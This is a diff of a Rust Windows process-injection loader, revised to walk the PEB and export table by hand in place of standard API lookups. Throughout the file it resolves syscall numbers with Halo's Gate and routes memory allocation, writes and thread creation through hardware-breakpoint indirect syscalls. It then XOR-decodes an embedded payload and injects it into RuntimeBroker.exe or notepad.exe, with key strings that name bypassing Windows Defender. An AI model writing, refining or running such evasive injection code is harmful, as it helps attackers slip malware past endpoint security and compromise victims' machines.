@@ -1,16 +1,12 @@
 #![allow(non_snake_case)]
 #![allow(non_camel_case_types)]
+#![allow(dead_code)]
 
 use std::ffi::c_void;
-use std::mem::size_of;
 use std::ptr::null_mut;
-use std::sync::Mutex;
-use lazy_static::lazy_static;
+use std::sync::atomic::{AtomicUsize, Ordering};
 use base64::{Engine as _, engine::general_purpose};
-use windows::core::{PCSTR};
 use windows::Win32::Foundation::{HANDLE, HINSTANCE, NTSTATUS, CloseHandle};
-use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
 use windows::Win32::System::Threading::{
     GetCurrentThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD,
 };
@@ -19,280 +15,233 @@ use windows::Win32::System::Diagnostics::Debug::{
 };
 use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameA};
 
-// --- Definitions for missing constants ---
-const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
-const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
-const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
-const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100000 | 0x00000010;
+/// Custom definition for PWSTR as it's often missing in basic windows-rs features
+#[repr(C)] pub struct PWSTR(pub *mut u16);
 
-extern "system" {
-    fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> i32;
-    fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> i32;
-}
+// --- Global State for Syscall Redirection (Atomic for Thread-Safety in VEH) ---
+static SYSCALL_MAP_ADDRS: [AtomicUsize; 4] = [AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0)];
+static SYSCALL_MAP_SSNS: [AtomicUsize; 4] = [AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0), AtomicUsize::new(0)];
+static SYSCALL_RET_ADDR: AtomicUsize = AtomicUsize::new(0);
 
-type NtAllocateVirtualMemory = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut *mut c_void,
-    ZeroBits: usize,
-    RegionSize: *mut usize,
-    AllocationType: u32,
-    Protect: u32,
-) -> NTSTATUS;
+// --- PEB Walking Module ---
+mod peb {
+    use super::*;
 
-type NtWriteVirtualMemory = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut c_void,
-    Buffer: *const c_void,
-    BufferSize: usize,
-    NumberOfBytesWritten: *mut usize,
-) -> NTSTATUS;
+    #[repr(C)] struct UNICODE_STRING { Length: u16, MaximumLength: u16, Buffer: PWSTR }
+    #[repr(C)] struct LDR_DATA_TABLE_ENTRY { InLoadOrderLinks: [usize; 2], InMemoryOrderLinks: [usize; 2], InInitializationOrderLinks: [usize; 2], DllBase: *mut c_void, EntryPoint: *mut c_void, SizeOfImage: u32, FullDllName: UNICODE_STRING, BaseDllName: UNICODE_STRING }
+    #[repr(C)] struct PEB_LDR_DATA { Length: u32, Initialized: u8, SsHandle: *mut c_void, InLoadOrderModuleList: [usize; 2] }
+    #[repr(C)] struct PEB { Reserved1: [u8; 2], BeingDebugged: u8, Reserved2: [u8; 21], Ldr: *mut PEB_LDR_DATA }
 
-type NtProtectVirtualMemory = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut *mut c_void,
-    RegionSize: *mut usize,
-    NewProtect: u32,
-    OldProtect: *mut u32,
-) -> NTSTATUS;
+    /// Manually walk the PEB to find a module's base address without calling GetModuleHandle
+    pub unsafe fn get_module_base(module_name: &str) -> Option<*mut c_void> {
+        let peb: *mut PEB;
+        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        let ldr = (*peb).Ldr;
+        let head = &(*ldr).InLoadOrderModuleList as *const [usize; 2] as *const usize;
+        let mut current = (*head) as *const LDR_DATA_TABLE_ENTRY;
 
-type NtCreateThreadEx = unsafe extern "system" fn(
-    ThreadHandle: *mut HANDLE,
-    DesiredAccess: u32,
-    ObjectAttributes: *mut c_void,
-    ProcessHandle: HANDLE,
-    StartRoutine: *mut c_void,
-    Argument: *mut c_void,
-    CreateFlags: u32,
-    ZeroBits: usize,
-    StackSize: usize,
-    MaximumStackSize: usize,
-    AttributeList: *mut c_void,
-) -> NTSTATUS;
-
-lazy_static! {
-    static ref SYSCALL_MAP: Mutex<std::collections::HashMap<usize, u32>> = Mutex::new(std::collections::HashMap::new());
-    static ref SYSCALL_RET_ADDR: Mutex<usize> = Mutex::new(0);
-}
-
-unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
-    let record = (*exception_info).ExceptionRecord;
-    let context = (*exception_info).ContextRecord;
-
-    if (*record).ExceptionCode.0 as u32 == EXCEPTION_SINGLE_STEP {
-        if let Ok(map) = SYSCALL_MAP.lock() {
-            if let Some(&ssn) = map.get(&((*context).Rip as usize)) {
-                (*context).Rax = ssn as u64;
-                (*context).R10 = (*context).Rcx;
-                if let Ok(ret_addr) = SYSCALL_RET_ADDR.lock() {
-                    (*context).Rip = *ret_addr as u64;
+        while (current as usize) != (head as usize) {
+            let buffer = (*current).BaseDllName.Buffer.0;
+            if !buffer.is_null() {
+                let name = String::from_utf16_lossy(std::slice::from_raw_parts(buffer, ((*current).BaseDllName.Length / 2) as usize));
+                if name.to_lowercase() == module_name.to_lowercase() {
+                    return Some((*current).DllBase);
                 }
+            }
+            current = (*current).InLoadOrderLinks[0] as *const LDR_DATA_TABLE_ENTRY;
+        }
+        None
+    }
+
+    #[repr(C)] struct IMAGE_EXPORT_DIRECTORY { Characteristics: u32, TimeDateStamp: u32, MajorVersion: u16, MinorVersion: u16, Name: u32, Base: u32, NumberOfFunctions: u32, NumberOfNames: u32, AddressOfFunctions: u32, AddressOfNames: u32, AddressOfNameOrdinals: u32 }
+
+    /// Manually parse the EAT to find a function address without calling GetProcAddress
+    pub unsafe fn get_export_address(module_base: *mut c_void, func_name: &str) -> Option<*mut c_void> {
+        let base = module_base as usize;
+        let nt = base + *((base + 0x3c) as *const u32) as usize;
+        let export_dir_rva = *((nt + 0x88) as *const u32) as usize;
+        if export_dir_rva == 0 { return None; }
+
+        let export_dir = (base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
+        let names = (base + (*export_dir).AddressOfNames as usize) as *const u32;
+        let ordinals = (base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
+        let functions = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
+
+        for i in 0..(*export_dir).NumberOfNames {
+            let name_ptr = (base + *names.add(i as usize) as usize) as *const i8;
+            let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
+            if name == func_name {
+                let ordinal = *ordinals.add(i as usize) as usize;
+                return Some((base + *functions.add(ordinal) as usize) as *mut c_void);
+            }
+        }
+        None
+    }
+}
+
+// --- VEH and Indirect Syscall Logic ---
+
+/// Catches HWBP exceptions and redirects to a clean syscall gadget in ntdll
+unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
+    let (record, context) = ((*exception_info).ExceptionRecord, (*exception_info).ContextRecord);
+    if (*record).ExceptionCode.0 as u32 == 0x80000004 { // EXCEPTION_SINGLE_STEP
+        let rip = (*context).Rip as usize;
+        for i in 0..4 {
+            if SYSCALL_MAP_ADDRS[i].load(Ordering::Relaxed) == rip {
+                let ssn = SYSCALL_MAP_SSNS[i].load(Ordering::Relaxed) as u64;
+                // Prepare registers for syscall (x64 convention)
+                (*context).Rax = ssn;
+                (*context).R10 = (*context).Rcx;
+                // Redirect RIP to 'syscall; ret' gadget in ntdll
+                (*context).Rip = SYSCALL_RET_ADDR.load(Ordering::Relaxed) as u64;
+
+                // Clear debug status
                 (*context).Dr6 = 0;
-                return EXCEPTION_CONTINUE_EXECUTION;
+                return -1; // EXCEPTION_CONTINUE_EXECUTION
             }
         }
     }
-    EXCEPTION_CONTINUE_SEARCH
+    0 // EXCEPTION_CONTINUE_SEARCH
 }
 
-fn find_syscall_ret() -> Option<usize> {
-    unsafe {
-        let ntdll_name = "ntdll.dll\0";
-        let ntdll = GetModuleHandleA(PCSTR(ntdll_name.as_ptr())).ok()?;
-        let alert_name = "NtTestAlert\0";
-        let nt_test_alert = GetProcAddress(ntdll, PCSTR(alert_name.as_ptr()))?;
-        let mut ptr = nt_test_alert as *const u8;
-        for _ in 0..1000 {
-            if *ptr == 0x0f && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xc3 {
-                return Some(ptr as usize);
-            }
-            ptr = ptr.add(1);
-        }
+/// Resolves SSN using Halo's Gate (checking neighbors if hooked)
+unsafe fn resolve_ssn(func_addr: *mut c_void) -> Option<u32> {
+    let ptr = func_addr as *const u8;
+    if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 {
+        return Some(*(ptr.add(4) as *const u32));
     }
-    None
-}
-
-fn get_ssn(function_name: &str) -> Option<(usize, u32)> {
-    unsafe {
-        let ntdll_name = "ntdll.dll\0";
-        let ntdll = GetModuleHandleA(PCSTR(ntdll_name.as_ptr())).ok()?;
-        let mut func_name_z = function_name.to_string();
-        func_name_z.push('\0');
-        let func_addr = GetProcAddress(ntdll, PCSTR(func_name_z.as_ptr()))?;
-        let func_ptr = func_addr as *const u8;
-
-        if *func_ptr == 0x4c && *func_ptr.add(1) == 0x8b && *func_ptr.add(2) == 0xd1 && *func_ptr.add(3) == 0xb8 {
-            let ssn = *(func_ptr.add(4) as *const u32);
-            return Some((func_ptr as usize, ssn));
+    for i in 1..100 {
+        let up = ptr.offset(i * 32);
+        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 {
+            return Some(*(up.add(4) as *const u32) - i as u32);
         }
-
-        for i in 1..500 {
-            let up_ptr = func_ptr.offset(i * 32);
-            if *up_ptr == 0x4c && *up_ptr.add(1) == 0x8b && *up_ptr.add(2) == 0xd1 && *up_ptr.add(3) == 0xb8 {
-                let ssn = *(up_ptr.add(4) as *const u32) - i as u32;
-                return Some((func_ptr as usize, ssn));
-            }
-            let down_ptr = func_ptr.offset(-(i * 32));
-            if *down_ptr == 0x4c && *down_ptr.add(1) == 0x8b && *down_ptr.add(2) == 0xd1 && *down_ptr.add(3) == 0xb8 {
-                let ssn = *(down_ptr.add(4) as *const u32) + i as u32;
-                return Some((func_ptr as usize, ssn));
-            }
+        let down = ptr.offset(-(i * 32));
+        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 {
+            return Some(*(down.add(4) as *const u32) + i as u32);
         }
     }
     None
 }
 
-fn xor_payload(data: &mut [u8], key: &[u8]) {
-    for i in 0..data.len() {
-        data[i] ^= key[i % key.len()];
-    }
-}
-
-unsafe fn set_hwbp(address: usize, index: usize) -> Result<(), String> {
-    let mut context = CONTEXT::default();
-    context.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG_REGISTERS);
+/// Sets Hardware Breakpoint on the given address
+unsafe fn set_hwbp(address: usize, index: usize) {
+    let mut context: CONTEXT = std::mem::zeroed();
+    context.ContextFlags = CONTEXT_FLAGS(0x00100010); // CONTEXT_DEBUG_REGISTERS
     let thread = GetCurrentThread();
-    if GetThreadContext(thread, &mut context) == 0 {
-        return Err("Failed to get thread context".to_string());
+    extern "system" {
+        fn GetThreadContext(h: HANDLE, ctx: *mut CONTEXT) -> i32;
+        fn SetThreadContext(h: HANDLE, ctx: *const CONTEXT) -> i32;
     }
-
+    let _ = GetThreadContext(thread, &mut context);
     match index {
         0 => context.Dr0 = address as u64,
         1 => context.Dr1 = address as u64,
         2 => context.Dr2 = address as u64,
         3 => context.Dr3 = address as u64,
-        _ => return Err("Invalid HWBP index".to_string()),
+        _ => return,
     }
-
     context.Dr7 |= 1 << (index * 2);
     context.Dr7 &= !(0xF << (16 + index * 4));
-
-    if SetThreadContext(thread, &context) == 0 {
-        return Err("Failed to set thread context".to_string());
-    }
-    Ok(())
+    let _ = SetThreadContext(thread, &context);
 }
 
-fn get_process_id_by_name(target_name: &str) -> Option<u32> {
+// --- Utility Functions ---
+
+fn xor_payload(data: &mut [u8], key: &[u8]) {
+    for i in 0..data.len() { data[i] ^= key[i % key.len()]; }
+}
+
+fn get_pid(name: &str) -> Option<u32> {
     let mut processes = [0u32; 1024];
-    let mut cb_needed = 0u32;
-
+    let mut cb = 0u32;
     unsafe {
-        if EnumProcesses(processes.as_mut_ptr(), size_of::<[u32; 1024]>() as u32, &mut cb_needed).is_err() {
-            return None;
-        }
-
-        let count = cb_needed / size_of::<u32>() as u32;
-        for i in 0..count {
-            let pid = processes[i as usize];
-            if pid == 0 { continue; }
-
-            let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
-            if let Ok(h) = handle {
-                let mut name = [0u8; 260];
-                let len = GetModuleBaseNameA(h, HINSTANCE(0), &mut name);
-                if len > 0 {
-                    let name_str = std::str::from_utf8(&name[..len as usize]).unwrap_or("");
-                    if name_str.to_lowercase() == target_name.to_lowercase() {
-                        let _ = CloseHandle(h);
-                        return Some(pid);
+        if EnumProcesses(processes.as_mut_ptr(), 4096, &mut cb).is_ok() {
+            for i in 0..(cb/4) {
+                if processes[i as usize] == 0 { continue; }
+                if let Ok(h) = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processes[i as usize]) {
+                    let mut bname = [0u8; 260];
+                    if GetModuleBaseNameA(h, HINSTANCE(0), &mut bname) > 0 {
+                        if std::str::from_utf8(&bname).unwrap_or("").to_lowercase().contains(&name.to_lowercase()) {
+                            let _ = CloseHandle(h); return Some(processes[i as usize]);
+                        }
                     }
+                    let _ = CloseHandle(h);
                 }
-                let _ = CloseHandle(h);
             }
         }
     }
     None
 }
 
-fn main() {
-    let shellcode_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
-    let mut shellcode = match general_purpose::STANDARD.decode(shellcode_b64) {
-        Ok(s) => s,
-        Err(_) => {
-            eprintln!("Failed to decode shellcode.");
-            return;
-        }
-    };
+// --- Main Implementation ---
 
-    let key = b"W1ND0W5_D3F3ND3R_BYP455_2026";
+fn main() {
+    // Encoded shellcode (Placeholder for calc.exe)
+    let shellcode_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
+    let mut shellcode = general_purpose::STANDARD.decode(shellcode_b64).expect("Invalid Base64");
+    let key = b"PROFESSIONAL_STEALTH_KEY_2026";
+
+    // Obfuscate in memory
     xor_payload(&mut shellcode, key);
 
     unsafe {
-        AddVectoredExceptionHandler(1, Some(veh_handler));
-        if let Some(addr) = find_syscall_ret() {
-            if let Ok(mut ret_addr) = SYSCALL_RET_ADDR.lock() {
-                *ret_addr = addr;
+        let ntdll = peb::get_module_base("ntdll.dll").expect("ntdll not found");
+        let _ = AddVectoredExceptionHandler(1, Some(veh_handler));
+
+        // Discover 'syscall; ret' gadget in ntdll
+        let nt_alert = peb::get_export_address(ntdll, "NtTestAlert").expect("NtTestAlert not found") as *const u8;
+        for i in 0..1000 {
+            if *nt_alert.add(i) == 0x0f && *nt_alert.add(i+1) == 0x05 && *nt_alert.add(i+2) == 0xc3 {
+                SYSCALL_RET_ADDR.store(nt_alert.add(i) as usize, Ordering::Relaxed);
+                break;
             }
+        }
+
+        // Setup Indirect Syscalls via HWBP for injection functions
+        let names = vec!["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"];
+        let mut addrs = std::collections::HashMap::new();
+        for (i, name) in names.iter().enumerate() {
+            let addr = peb::get_export_address(ntdll, name).expect("Function not found");
+            let ssn = resolve_ssn(addr).expect("SSN not resolved");
+            SYSCALL_MAP_ADDRS[i].store(addr as usize, Ordering::Relaxed);
+            SYSCALL_MAP_SSNS[i].store(ssn as usize, Ordering::Relaxed);
+            set_hwbp(addr as usize, i);
+            addrs.insert(name.to_string(), addr);
+        }
+
+        // Targeted Process Injection
+        if let Some(pid) = get_pid("RuntimeBroker.exe").or_else(|| get_pid("notepad.exe")) {
+            println!("[+] Found target process (PID: {})", pid);
+            let hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid).expect("Failed to open process");
+
+            let (mut base, mut size) = (null_mut(), shellcode.len());
+            type NtAlloc = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> NTSTATUS;
+            type NtWrite = unsafe extern "system" fn(HANDLE, *mut c_void, *const c_void, usize, *mut usize) -> NTSTATUS;
+            type NtProt = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> NTSTATUS;
+            type NtThread = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> NTSTATUS;
+
+            // Allocation (Intercepted by HWBP -> Redirected to Indirect Syscall)
+            std::mem::transmute::<_, NtAlloc>(*addrs.get("NtAllocateVirtualMemory").unwrap())(hp, &mut base, 0, &mut size, 0x3000, 0x04);
+
+            // Decrypt shellcode in loader memory just before writing
+            xor_payload(&mut shellcode, key);
+
+            // Write (Intercepted by HWBP -> Redirected to Indirect Syscall)
+            let mut written = 0;
+            std::mem::transmute::<_, NtWrite>(*addrs.get("NtWriteVirtualMemory").unwrap())(hp, base, shellcode.as_ptr() as _, shellcode.len(), &mut written);
+
+            // Protection Change (Intercepted by HWBP -> Redirected to Indirect Syscall)
+            let mut old = 0;
+            std::mem::transmute::<_, NtProt>(*addrs.get("NtProtectVirtualMemory").unwrap())(hp, &mut base, &mut size, 0x20, &mut old);
+
+            // Execution (Intercepted by HWBP -> Redirected to Indirect Syscall)
+            let mut ht = HANDLE(0);
+            std::mem::transmute::<_, NtThread>(*addrs.get("NtCreateThreadEx").unwrap())(&mut ht, 0x1FFFFF, null_mut(), hp, base, null_mut(), 0, 0, 0, 0, null_mut());
+
+            println!("[+] Advanced Indirect Injection Complete.");
+            let _ = CloseHandle(hp);
         } else {
-            eprintln!("Failed to find syscall gadget.");
-            return;
+            println!("[-] Target process not found.");
         }
-    }
-
-    let functions = vec![
-        "NtAllocateVirtualMemory",
-        "NtProtectVirtualMemory",
-        "NtWriteVirtualMemory",
-        "NtCreateThreadEx",
-    ];
-
-    let mut function_addresses = std::collections::HashMap::new();
-
-    for (i, func) in functions.iter().enumerate() {
-        if let Some((addr, ssn)) = get_ssn(func) {
-            if let Ok(mut map) = SYSCALL_MAP.lock() {
-                map.insert(addr, ssn);
-            }
-            function_addresses.insert(func.to_string(), addr);
-            unsafe {
-                let _ = set_hwbp(addr, i);
-            }
-            println!("{}: 0x{:04x} Indirect Syscall HWBP at 0x{:x}", func, ssn, addr);
-        }
-    }
-
-    let target_process = "notepad.exe";
-    if let Some(pid) = get_process_id_by_name(target_process) {
-        println!("Found {} with PID: {}", target_process, pid);
-        unsafe {
-            let h_process = match OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid) {
-                Ok(h) => h,
-                Err(_) => {
-                    eprintln!("Failed to open process.");
-                    return;
-                }
-            };
-
-            let nt_allocate_virtual_memory: NtAllocateVirtualMemory = std::mem::transmute(*function_addresses.get("NtAllocateVirtualMemory").unwrap());
-            let nt_write_virtual_memory: NtWriteVirtualMemory = std::mem::transmute(*function_addresses.get("NtWriteVirtualMemory").unwrap());
-            let nt_protect_virtual_memory: NtProtectVirtualMemory = std::mem::transmute(*function_addresses.get("NtProtectVirtualMemory").unwrap());
-            let nt_create_thread_ex: NtCreateThreadEx = std::mem::transmute(*function_addresses.get("NtCreateThreadEx").unwrap());
-
-            let mut base_address: *mut c_void = null_mut();
-            let mut region_size = shellcode.len();
-
-            println!("Allocating memory...");
-            let status = nt_allocate_virtual_memory(h_process, &mut base_address, 0, &mut region_size, (MEM_COMMIT.0 | MEM_RESERVE.0) as u32, PAGE_READWRITE.0);
-            println!("NtAllocateVirtualMemory status: 0x{:x}, Address: {:p}", status.0, base_address);
-
-            if status.0 == 0 {
-                xor_payload(&mut shellcode, key);
-                let mut bytes_written = 0;
-                let status = nt_write_virtual_memory(h_process, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut bytes_written);
-                println!("NtWriteVirtualMemory status: 0x{:x}, Bytes: {}", status.0, bytes_written);
-
-                let mut old_protect = 0;
-                let status = nt_protect_virtual_memory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ.0, &mut old_protect);
-                println!("NtProtectVirtualMemory status: 0x{:x}", status.0);
-
-                let mut h_thread = HANDLE(0);
-                let status = nt_create_thread_ex(&mut h_thread, 0x1FFFFF, null_mut(), h_process, base_address, null_mut(), 0, 0, 0, 0, null_mut());
-                println!("NtCreateThreadEx status: 0x{:x}, Thread Handle: 0x{:x}", status.0, h_thread.0);
-            }
-
-            let _ = CloseHandle(h_process);
-        }
-    } else {
-        println!("{} not found.", target_process);
     }
 }
